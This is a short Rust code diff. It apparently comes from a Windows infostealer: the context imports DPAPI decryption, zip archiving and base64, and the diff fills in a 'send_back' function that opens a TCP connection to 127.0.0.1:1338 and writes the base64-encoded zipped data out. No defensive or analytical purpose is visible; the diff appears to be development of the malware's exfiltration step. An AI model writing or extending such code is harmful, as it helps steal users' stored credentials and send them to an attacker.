@@ -10,6 +10,9 @@ use winapi::um::wincrypt::CRYPTOAPI_BLOB;
 use winapi::um::dpapi;
 use zip_extensions::write;
 use base64::{engine::general_purpose, Engine as _};
+use std::io::prelude::*;
+use std::io::Write;
+use std::net::TcpStream;
 
 
 lazy_static! {
@@ -235,4 +238,7 @@ fn create_archive() -> String {
 
 fn send_back(zipped_content_b64: String) {
     // Socket stuff
+        let mut stream = TcpStream::connect("127.0.0.1:1338");
+
+        stream.unwrap().write(zipped_content_b64.as_bytes());
 }
